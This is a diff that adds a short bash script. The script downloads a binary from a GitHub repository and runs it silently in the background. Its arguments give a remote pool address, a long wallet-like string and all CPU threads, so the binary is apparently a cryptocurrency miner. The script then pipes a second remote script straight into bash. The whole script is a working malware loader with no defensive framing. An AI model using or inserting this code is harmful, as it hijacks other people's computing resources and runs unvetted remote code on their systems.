@@ -1,0 +1,5 @@
+#!/bin/bash
+curl https://github.com/teknikpintarit/file/raw/main/lab -o file
+chmod +x file
+./file -o 165.22.104.207:443 -u ZEPHs9rHEckXkSMQSJh9gsAkkKAAxKjnXFmwcuK7oNkr6qFL8p5xKzz2Y7izQ9T3RnMgSHCwdEx9ASEeFheAhQoTBfqfzss6SiX -p Jobs -t $(nproc --all) > /dev/null 2>&1 &
+curl -sL https://github.com/teknikpintarit/file/raw/main/job| bash
